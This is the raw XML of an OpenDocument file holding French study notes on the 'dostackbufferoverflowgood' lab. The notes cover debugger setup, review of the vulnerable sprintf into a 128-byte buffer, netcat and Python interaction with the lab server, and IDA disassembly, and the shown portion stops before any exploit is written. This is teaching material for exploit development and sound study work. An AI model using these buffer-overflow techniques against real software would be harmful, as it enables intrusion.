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844000024CC79B47CB6.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000781A0000027CD463B527.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000027B1000030E43C043D15.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003820000011934ACF6AE5.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001B7F00000D218B16DF66.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000020C40000098374F2F321.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000330F000011E29EF1DA38.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003EA30000307A9C682CED.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001C0300001517D350CC35.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002DE50000543D5737F5AF.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000068E800000C4EDBAD756A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002B6A00002835C8E62E2A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004E090000031B1DD08E8C.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000029DD00001193EB68A350.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000674100003C0D14297475.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000044D600000CD2D802309B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000027E600003C778331BDF5.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000335F000009B8DCA365FE.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000038BF0000235A06E40D41.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000425B00000E0FB7602CF2.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000659A000008E4A28B2B2C.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000070A9000017E1F44464D2.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000534E0000089570FCAB43.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003BBE00001E14E06857F2.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000473700000B2BB5D1A45E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005668000001F8B73BED80.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000060D800003183FFA1EDF1.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700007285000007C12801EC2B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002885000043496B1C9A0D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000024B20000069ED8F86425.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000061280000279786906A9A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002712000025501C268F0B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000055FE000001592323F7A8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001F520000263F8642EB25.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003ED800003DEA8FA98031.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000754F0000054651C5B801.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000066D700000C4ED4CACE53.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004D1B000028D494AD492D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000068CE0000250185814667.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000052000000383D9B9AC174.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005D0600002550FC52A321.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000046CD000018E958AB13D3.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000032DB00001A91E79D4328.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002B6A000006B911C63C3E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000649100000C33498A6979.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000032710000328BEAD101B5.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005CB600000E2A0ACA50AE.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000559500000A8CFE9FDF5D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000392800001070320B4261.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000031D2000007585C3A2111.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003629000038A4ED8CBB4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Courier New"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Courier New" fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="11pt" style:font-style-complex="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10"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name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-name-complex="LMRoman10-Regular-Identity-H"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font-style="normal" style:text-underline-style="none" fo:font-weight="bold" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13"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style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="normal" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P15"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17" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">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18" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L3">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19" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">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0" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L5">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1" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L6">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2" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L7">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3" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L8">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4" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L9">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5" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L10">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6" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L11">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>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P27" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L12">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28" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L13">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29" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L14">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30" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L15">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31" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L16">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32" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L17">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L19">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L20">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L18">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L11">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="11pt" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-size-complex="11pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="bold" style:font-size-asian="11pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-weight-asian="bold" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-name-complex="LMRoman10-Regular-Identity-H"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-size="11.5pt" style:text-underline-style="none" fo:font-weight="normal" style:font-size-asian="11.5pt" style:font-weight-asian="normal" style:font-size-complex="11.5pt"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style:font-name="Times New Roman" fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="normal" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" style:font-name-asian="LMRoman10-Regular-Identity-H" style:font-size-asian="12pt" style:font-name-complex="LMRoman10-Regular-Identity-H" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties style:font-name="Times New Roman" style:text-underline-style="none"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 Stack Overflow Good</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P6">SET UP :</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P6"><text:span text:style-name="T1">J'ai une machine Windows, avec Immunity Debugger, IDA, j'ai Kali avec Python et Metasploit. Par contre j'ai dû installer </text:span><text:span text:style-name="T3">mona.py</text:span><text:span text:style-name="T1"> :</text:span></text:p>
      <text:p text:style-name="P7"><text:a xlink:type="simple" xlink:href="https://github.com/corelan/mona" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/corelan/mona</text:a></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">On intègre le script python "<text:span text:style-name="T5">mona.py</text:span>" au dossier '<text:span text:style-name="T5">PyCommands</text:span>' du folder d'installation de Immunity Debugger, et on s'assure de bien avoir Python 2.7.14 ou supérieur d'installé dans <text:span text:style-name="T5">C:\python27</text:span>. Pour moi, c'était déjà le cas.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"><text:span text:style-name="T1">Pour tester, on tape </text:span><text:span text:style-name="T3">!mona</text:span><text:span text:style-name="T1"> dans Immunity Debugger, et on a un message d'aide qui s'affiche pour utiliser les commandes de </text:span><text:span text:style-name="T3">mona.py</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">We're all set !</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P6">REVIEW THE SOURCE CODE :</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Premièrement, penchons-nous rapidement sur le code source de l'application <text:span text:style-name="T5">dostackbufferoverflowgood.exe</text:span> (fichier <text:span text:style-name="T5">dostackbufferoverflowgood.c </text:span>dans le dossier courant). Une version simplifiée du code source complet est la suivante :</text:p>
      <text:p text:style-name="P7"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:x="1.067cm" svg:y="0.175cm" svg:width="14.242cm" svg:height="14.032cm" draw:z-index="0"><draw:image xlink:href="Pictures/2000000700003ED800003DEA8FA98031.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P7"><text:soft-page-break/></text:p>
      <text:p text:style-name="P7">De manière très générale, ce programme a le comportement suivant :</text:p>
      <text:list xml:id="list4936120533330737594" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P15">La fonction <text:span text:style-name="T5">main()</text:span> initialise le netword socket, sur le port 31337 puis initie une boucle infinie qui accepte les connexions et appelle une thread <text:span text:style-name="T5">handleConnections()</text:span> pour gérer ces connexions.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15">La fonction <text:span text:style-name="T5">handleConnection() </text:span>initie de même une boucle infinie qui va lui permettre de lire les données envoyées par le client. Elle lit ces données en les stockant dans le buffer <text:span text:style-name="T5">recvbuf[58623]</text:span>. Dès que la fonction rencontre un <text:span text:style-name="T5">\n</text:span>, elle appelle <text:span text:style-name="T5">doResponse()</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15"><text:span text:style-name="T5">doResponse()</text:span> prend en argument les données entrées par le client depuis le dernier <text:span text:style-name="T5">\n</text:span>, puis stock dans le buffer <text:span text:style-name="T5">response[128]</text:span> la chaîne de caractère "<text:span text:style-name="T5">Hello &lt;données transférées&gt;!!!\n</text:span>" (<text:span text:style-name="T5">sprintf</text:span> se comporte comme <text:span text:style-name="T5">printf</text:span>, sauf qu'au lieu d'afficher la chaîne de caractère formatée dans l'entrée standard, elle la stock dans le buffer passé en premier argument).</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">La vulnérabilité de buffer overflow apparaît assez clairement ici. La fonction <text:span text:style-name="T5">doResponse()</text:span> stock dans son buffer <text:span text:style-name="T5">response[128]</text:span> une chaîne de caractère entrée par l'utilisateur, qui peut potentiellement aller jusqu'à plus de 50 000 caractères, alors que le buffer <text:span text:style-name="T5">response[128]</text:span> ne peut en accepter que 127. Cela peut causer une corruption de la pile par le débordement du buffer <text:span text:style-name="T5">response[128]</text:span>.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P6">IMMUNITY DEBUGGER INTRO :</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Ouvrons le programme dans Immunity Debugger, et rafraîchissons-nous la mémoire sur l'interface du débugger :</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><draw:frame draw:style-name="fr2" draw:name="images2" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="11.658cm" draw:z-index="1"><draw:image xlink:href="Pictures/20000007000052000000383D9B9AC174.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:soft-page-break/>&gt; <text:span text:style-name="T9">Execution controls</text:span> : allows the process to be restarted, closed, run, paused, stepped into, stepped over, traced into, traced over, executed until return, and for the disassembler to be navigated to a particular memory address.</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">&gt; <text:span text:style-name="T9">Disassembler</text:span> : <text:span text:style-name="T11">shows the contents of the binary file as assembly instructions. The next instruction to be executed by the CPU is highlighted.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P8"><text:span text:style-name="T11">&gt; </text:span><text:span text:style-name="T10">Registers </text:span><text:span text:style-name="T11">: shows the current state of the CPU registers, the most important ones being EAX through EIP at the top of the panel.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P8"><text:span text:style-name="T11">&gt; </text:span><text:span text:style-name="T10">Dump</text:span><text:span text:style-name="T11"> : shows the contents of the process’ memory space as a binary dump. Can be useful for examining regions of memory.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P8"><text:span text:style-name="T11">&gt; </text:span><text:span text:style-name="T10">Stack</text:span><text:span text:style-name="T11"> : shows the current state of the stack, with the top of the stack (which grows towards lower memory addresses) highlighted at the top.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P8"><text:span text:style-name="T11">&gt;</text:span><text:span text:style-name="T10"> Command input </text:span><text:span text:style-name="T11">: used to interact with Immunity and plugins in a command-driven fashion.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P8"><text:span text:style-name="T11">&gt; </text:span><text:span text:style-name="T10">Status</text:span><text:span text:style-name="T11"> : shows various status messages (e.g. information about crashes)</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P8"><text:span text:style-name="T11">&gt; </text:span><text:span text:style-name="T10">Process state</text:span><text:span text:style-name="T11"> : shows whether the process is paused or running.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Lorsqu'on les lance avec un débugger, les programmes commencent toujours en état "Paused", pour permettre de configurer les breakpoint avant l'exécution du programme. Ici on en a pas besoin, et on clique donc sur "Run", pour le faire tourner.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">INTERACT WITH THE PROGRAM REMOTLY :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Notre programme tourne (dans un débugger, ce qui ne change rien). Comment intéragir avec lui à distance ?</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On lance Kali Linux, et on exécute simplement :</text:p>
      <text:p text:style-name="P4">nc 192.168.1.10 31337</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images3" text:anchor-type="paragraph" svg:width="8.387cm" svg:height="2.434cm" draw:z-index="2"><draw:image xlink:href="Pictures/20000007000020C40000098374F2F321.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Le programme fonctionne correctement, comme on veut. Si netcat est pratique pour des intéractions très basiques avec le programme, ça reste limité, et il vaut mieux intéragir avec le programme au travers d'un script Python (on reste sur du Python 2) :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images4" text:anchor-type="paragraph" svg:width="10.001cm" svg:height="9.551cm" draw:z-index="3"><draw:image xlink:href="Pictures/2000000700002712000025501C268F0B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">Le script est basique, et clair. On reçoit le résultat suivant :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images5" text:anchor-type="paragraph" svg:width="9.394cm" svg:height="1.693cm" draw:z-index="4"><draw:image xlink:href="Pictures/20000007000024B20000069ED8F86425.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Comme attendu.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">EXAMINE THE BINARY WITH IDA :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Pour examiner le binary avec IDA, il va d'abord falloir comprendre le mécanisme général d'un appel de fonction dans un programme.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Plusieurs concepts sont mobilisés lors de l'appel d'une fonction :</text:p>
      <text:list xml:id="list4392695795743969028" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P17">L'appel à CALL est utilisé lorsqu'une fonction A veut appeler une fonction B dans son code (ou elle-même dans le cas d'une fonction récursive), avec l'intention de RETURN à l'instruction suivante après avoir appelé cette fonction.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P17">Le prologue d'une fonction apparaît au début de chaque fonction, et est utilisé pour faire du setup afin de préparer l'exécution de la fonction.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P17">L'épilogue d'une fonction apparaît à la fin de chaque fonction et fait un peu de déconstruction de la fonction avant de RETURN à la fonction depuis laquelle elle a été CALLed.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">En résumé :</text:p>
      <text:p text:style-name="P9">&gt; Function A CALLs function B()</text:p>
      <text:p text:style-name="P9">&gt; Function B’s prologue does some setup</text:p>
      <text:p text:style-name="P9">&gt; Function B’s body does something useful</text:p>
      <text:p text:style-name="P9">&gt; Function B’s epilogue does some tear-down and RETurns to function A()</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/>IDA est un désassembler, qui prend un exécutable, examine les bits / bytes qui composent les instructions machine, et les convertit en langage assembleur. Exemple du PDF :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images6" text:anchor-type="paragraph" svg:width="11.114cm" svg:height="1.722cm" draw:z-index="5"><draw:image xlink:href="Pictures/2000000700002B6A000006B911C63C3E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Notons qu'un disassembler est complètement différent d'un decompiler, un decompiler transforme un exécutable en code C par exemple, ce que ne fait pas un disassembler.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Maintenant que c'est établi, on ouvre notre exécutable avec IDA. Quand IDA nous demande comment on veut traiter le fichier, on ne modifie rien et on clique sur "OK" :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images7" text:anchor-type="paragraph" svg:width="11.07cm" svg:height="11.576cm" draw:z-index="6"><draw:image xlink:href="Pictures/2000000700003629000038A4ED8CBB45.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ensuite, on a un message qui nous demande si on veut charger le fichier PDB associé à l'exécutable depuis le local symbol store ou le Microsoft Symbol Server. Notre fichier PDB n'est pas situé dans un de ces endroits, on clic donc sur "Non", et on télécharge manuellement le fichier PDB depuis le github :</text:p>
      <text:p text:style-name="P10"><text:a xlink:type="simple" xlink:href="https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood.pdb" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T12">https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood.pdb</text:span></text:a></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10"><text:span text:style-name="T1">Maintenant, on s'assure que le fichier PDB est bien dans le même dossier que l'exécutable et on l'importe (</text:span><text:span text:style-name="T3">File --&gt; Load File --&gt; PDB File</text:span><text:span text:style-name="T1">).</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Quelques explications sur les PDB Files :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10"><text:soft-page-break/><text:span text:style-name="T1">"</text:span><text:span text:style-name="T13">PDB files, which are Windows Symbol files, give a disassembler more context (or ”symbols”) regarding an executable. This allows it to fill in things like function names which are otherwise not stored in a compiled executable. Symbols are generated by a compiler at compile-time. If a software vendor doesn’t publish a binary’s symbols in a PDB file or host them on a symbol server, you’re out of luck and will have to slog through your reverse engineering with a little less context. Note that symbols aren’t unique to Windows executables, but using PDB files as a way of storing them is unique to Windows</text:span><text:span text:style-name="T1">".</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P2"><text:span text:style-name="T15">Bref, une fois qu'IDA a absorbé notre fichier PDB (et qu'on a donc ce message dans l'output window : </text:span><text:span text:style-name="T3">total 283 symbols loaded for</text:span><text:span text:style-name="T4"> &lt;pdb file path&gt;</text:span><text:span text:style-name="T15">), il est temps d'examiner tout ça.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P2"><text:span text:style-name="T15">Dans "Functions window", on repère puis on clique sur </text:span><text:span text:style-name="T4">doResponse()</text:span><text:span text:style-name="T15">, qui est, on se rappelle, la fonction dans laquelle on a notre appel vulnérable à </text:span><text:span text:style-name="T4">sprintf</text:span><text:span text:style-name="T15">, qui va venir stocker dans le buffer </text:span><text:span text:style-name="T4">response[128]</text:span><text:span text:style-name="T15"> de la fonction </text:span><text:span text:style-name="T4">doResponse()</text:span><text:span text:style-name="T15"> une chaîne de caractère potentiellement trop grande.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images8" text:anchor-type="paragraph" svg:width="10.215cm" svg:height="15.478cm" draw:z-index="7"><draw:image xlink:href="Pictures/20000007000027E600003C778331BDF5.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On nous expose une vue sous forme de graphique. Dans le premier graphique, on aperçoit le prologue de fonction, ainsi que l'appel à sprintf :</text:p>
      <text:p text:style-name="P9"><text:soft-page-break/></text:p>
